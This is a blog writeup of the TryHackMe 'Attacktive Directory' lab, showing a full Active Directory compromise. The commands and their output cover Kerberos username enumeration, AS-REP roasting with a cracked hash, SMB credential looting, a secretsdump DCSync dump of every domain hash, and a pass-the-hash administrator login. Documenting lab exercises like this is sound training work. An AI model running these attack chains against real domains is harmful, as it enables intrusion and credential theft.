---
title: "THM Attacktive Directory Writeup"
date: 2023-07-10
tags: ["Security","AD"]
description: "All AD all the time."
draft: false
type: page
---
# THM "Attacktive Directory" Writeup

This is a room in TryHackMe dedicated to performing attacks on active directory and kerberos.

## Enumeration

To begin we will begin with our standard all ports, scripts, and services nmap scan. I will also run some stuff like `enum4linux` since I know this is an AD box.


```bash
Nmap scan report for 10.10.157.30
Host is up (0.22s latency).
Not shown: 65509 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-10 23:51:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   DNS_Tree_Name: spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-10T23:52:59+00:00
|_ssl-date: 2023-07-10T23:53:09+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Issuer: commonName=AttacktiveDirectory.spookysec.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-09T22:53:02
| Not valid after:  2024-01-08T22:53:02
| MD5:   2ad1:6073:f250:3300:2d76:f1b8:f508:72c8
|_SHA-1: d622:5699:e530:bc81:d88e:90fb:8a23:6428:98cb:6cb4
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49684/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2023-07-10T23:53:03
|_  start_date: N/A

```


```bash
[~/thm/attacktive]$ enum4linux 10.10.157.30
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Jul 10 18:54:38 2023

 =========================================( Target Information )=========================================

Target ........... 10.10.157.30
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.157.30 )============================


[E] Can't find workgroup/domain



 ================================( Nbtstat Information for 10.10.157.30 )================================

Looking up status of 10.10.157.30
No reply from 10.10.157.30

 ===================================( Session Check on 10.10.157.30 )===================================


[+] Server 10.10.157.30 allows sessions using username '', password ''


 ================================( Getting domain SID for 10.10.157.30 )================================

Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)


 ===================================( OS information on 10.10.157.30 )===================================


[E] Can't get OS info with smbclient


[+] Got OS info for 10.10.157.30 from srvinfo:
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 =======================================( Users on 10.10.157.30 )=======================================


[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED


 =================================( Share Enumeration on 10.10.157.30 )=================================

do_connect: Connection to 10.10.157.30 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.157.30


 ============================( Password Policy Information for 10.10.157.30 )============================


[E] Unexpected error from polenum:



[+] Attaching to 10.10.157.30 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.157.30)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient



 =======================================( Groups on 10.10.157.30 )=======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ==================( Users on 10.10.157.30 via RID cycling (RIDS: 500-550,1000-1050) )==================


[I] Found new SID:
S-1-5-21-3591857110-2884097990-301047963

[I] Found new SID:
S-1-5-21-3591857110-2884097990-301047963

[+] Enumerating users using SID S-1-5-21-3532885019-1334016158-1514108833 and logon username '', password ''

S-1-5-21-3532885019-1334016158-1514108833-500 ATTACKTIVEDIREC\Administrator (Local User)
S-1-5-21-3532885019-1334016158-1514108833-501 ATTACKTIVEDIREC\Guest (Local User)
S-1-5-21-3532885019-1334016158-1514108833-503 ATTACKTIVEDIREC\DefaultAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-504 ATTACKTIVEDIREC\WDAGUtilityAccount (Local User)
S-1-5-21-3532885019-1334016158-1514108833-513 ATTACKTIVEDIREC\None (Domain Group)

[+] Enumerating users using SID S-1-5-21-3591857110-2884097990-301047963 and logon username '', password ''

S-1-5-21-3591857110-2884097990-301047963-500 THM-AD\Administrator (Local User)
S-1-5-21-3591857110-2884097990-301047963-501 THM-AD\Guest (Local User)
S-1-5-21-3591857110-2884097990-301047963-502 THM-AD\krbtgt (Local User)
S-1-5-21-3591857110-2884097990-301047963-512 THM-AD\Domain Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-513 THM-AD\Domain Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-514 THM-AD\Domain Guests (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-515 THM-AD\Domain Computers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-516 THM-AD\Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-517 THM-AD\Cert Publishers (Local Group)
S-1-5-21-3591857110-2884097990-301047963-518 THM-AD\Schema Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-519 THM-AD\Enterprise Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-520 THM-AD\Group Policy Creator Owners (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-521 THM-AD\Read-only Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-522 THM-AD\Cloneable Domain Controllers (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-525 THM-AD\Protected Users (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-526 THM-AD\Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-527 THM-AD\Enterprise Key Admins (Domain Group)
S-1-5-21-3591857110-2884097990-301047963-1000 THM-AD\ATTACKTIVEDIREC$ (Local User)

 ===============================( Getting printer info for 10.10.157.30 )===============================

do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Mon Jul 10 19:06:28 2023
```


From the information that we gathered here, we can enumerate usernames with kerbrute.

```bash
[~/thm/attacktive]$ kerbrute userenum --dc 10.10.157.30 -d thm-ad userlist.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 07/10/23 - Ronnie Flathers @ropnop

2023/07/10 19:08:17 >  Using KDC(s):
2023/07/10 19:08:17 >   10.10.157.30:88

2023/07/10 19:08:18 >  [+] VALID USERNAME:       james@thm-ad
2023/07/10 19:08:22 >  [+] VALID USERNAME:       svc-admin@thm-ad
2023/07/10 19:08:27 >  [+] VALID USERNAME:       James@thm-ad
2023/07/10 19:08:29 >  [+] VALID USERNAME:       robin@thm-ad
2023/07/10 19:08:48 >  [+] VALID USERNAME:       darkstar@thm-ad
2023/07/10 19:09:00 >  [+] VALID USERNAME:       administrator@thm-ad
2023/07/10 19:09:24 >  [+] VALID USERNAME:       backup@thm-ad
2023/07/10 19:09:35 >  [+] VALID USERNAME:       paradox@thm-ad
2023/07/10 19:10:46 >  [+] VALID USERNAME:       JAMES@thm-ad
2023/07/10 19:11:10 >  [+] VALID USERNAME:       Robin@thm-ad
2023/07/10 19:13:35 >  [+] VALID USERNAME:       Administrator@thm-ad
2023/07/10 19:18:24 >  [+] VALID USERNAME:       Darkstar@thm-ad
2023/07/10 19:19:59 >  [+] VALID USERNAME:       Paradox@thm-ad
2023/07/10 19:25:14 >  [+] VALID USERNAME:       DARKSTAR@thm-ad
2023/07/10 19:26:44 >  [+] VALID USERNAME:       ori@thm-ad
2023/07/10 19:29:33 >  [+] VALID USERNAME:       ROBIN@thm-ad
2023/07/10 19:36:29 >  Done! Tested 73317 usernames (16 valid) in 1692.112 seconds
```


## Abusing Kerberos

We can use a tool from impacket called `GetNPUsers.py` to query for users that are potentially vulnerable to ASREPRoasting. 

ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. This means that the account does not need to provide valid identification before requesting a Kerberos Ticket on the specified user account.

```bash
[~/thm/attacktive]$ GetNPUsers.py spookysec.local/ -dc-ip 10.10.157.30 -usersfile validusers.txt -no-pass
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7dac032aeb131d30488aa4e7102e664a$8437aea78414dbca8c33faf12c6665d62a0f324c2e3bee566dfff1de0778e7d3326571d23ae98c1f0c91fd379cc82601808a032a440ae3e547c763b412b71b3796f4039ff311b72530a5cfeba532ba02de47db2a25a8789ebe5eec68ad575c4c4922c23da22f5a4ae5b4aaccd31093b188945139e83b6cb9526303cad42ec71cfb712753cafec4cd31db0b33df080c671b72318a1f8c6cc3389ac3e069d4f0745a47c8b4ebec86a6c91513fadbced3cf9491e873052ce0d642305a17b4aa262b54bfb17e4e794dc9d7e51cf916edc65301678c2420bfe0c4cd2275bd67568dc9ecbb851cdacfdb48a9249250796e5cb88247
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
```


We can crack this password and now we have a user.

```bash
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:7dac032aeb131d30488aa4e7102e664a$8437aea78414dbca8c33faf12c6665d62a0f324c2e3bee566dfff1de0778e7d3326571d23ae98c1f0c91fd379cc82601808a032a440ae3e547c763b412b71b3796f4039ff311b72530a5cfeba532ba02de47db2a25a8789ebe5eec68ad575c4c4922c23da22f5a4ae5b4aaccd31093b188945139e83b6cb9526303cad42ec71cfb712753cafec4cd31db0b33df080c671b72318a1f8c6cc3389ac3e069d4f0745a47c8b4ebec86a6c91513fadbced3cf9491e873052ce0d642305a17b4aa262b54bfb17e4e794dc9d7e51cf916edc65301678c2420bfe0c4cd2275bd67568dc9ecbb851cdacfdb48a9249250796e5cb88247:management2005
```

Per the instructions, we can RDP in and get a flag.

```bash 
xfreerdp /v:10.10.157.30  /u:svc-admin /p:management2005 /dynamic-resolution +clipboard
```

```
TryHackMe{K3rb3r0s_Pr3_4uth}
```


### Lateral Movement

We can now try to list some smb shares now that we have a user. Realistically we could try to rerun a lot of our enumeration.

```bash
[~/thm/attacktive]$ smbclient -L \\\\10.10.157.30\\ -U spookysec.local//svc-admin%management2005

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.157.30 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We can connect to the share that looks juicy and get a file.

```bash
[~/thm/attacktive]$ smbclient \\\\10.10.157.30\\backup -U spookysec.local//svc-admin%management2005
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Apr  4 15:08:39 2020
  ..                                  D        0  Sat Apr  4 15:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 15:08:53 2020

                8247551 blocks of size 4096. 3619238 blocks available
smb: \> get backup_credentials.txt
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)

```

```bash
[~/thm/attacktive]$ cat backup_credentials.txt
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw%
```

Presumably we can now RDP in and get another user flag.

Or, not!

These credentials are encoded.

I put them in cyberchef and run some magic on them, they were on b64.

```bash
backup@spookysec.local:backup2517860
```

Now, we get another flag.

```
TryHackMe{B4ckM3UpSc0tty!}
```


#### Privesc

This user had  privileges in which AD changes are synced to the user, which means that it could dump the ntds.dit file.

```bash
[~/thm/attacktive]$ secretsdump.py spookysec.local/backup:backup2517860@10.10.157.30 -dc-ip 10.10.157.30

Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:e62b6319202378e4de82172bca1b25c3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:8dd8fafa94073487da1892aed0677b046e961b833cf199c9ca5d3c7c089a0d69
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:8200586b6a90955f60e79e2dca312689
ATTACKTIVEDIREC$:des-cbc-md5:9426b6febf6dc2ab
[*] Cleaning up...
``` 

Importantly we have the administrator hash to own the whole domain.

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
``` 

We will pass the hash with evil-winrm to authenticate and get our flag.

```bash
evil-winrm -u administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.157.30
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/4/2020  11:39 AM             32 root.txt


ty*Evil-WinRM* PS C:\Users\Administrator\Desktop>type root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
```


### Bloodhound

To go a bit further, I wanted to load the domain into bloodhound to parse through some of what we were looking at and practice a bit.

I used the python bloodhound ingestor:

```bash
bloodhound-python -u svc-admin  -p management2005 -d spookysec.local -c All -ns 10.10.157.30 --zip
```


If we look at the `Find Principals with DCSync Rights` query, we could have figured out that backups could dump the ntds.dit.

There is another domain admin called `a-spooks`.

I tried to crack the password but that didn't work out.

I learned a new attack here in ASREPRoasting and some new kerberos enumeration techniques so I am very happy with this experience.
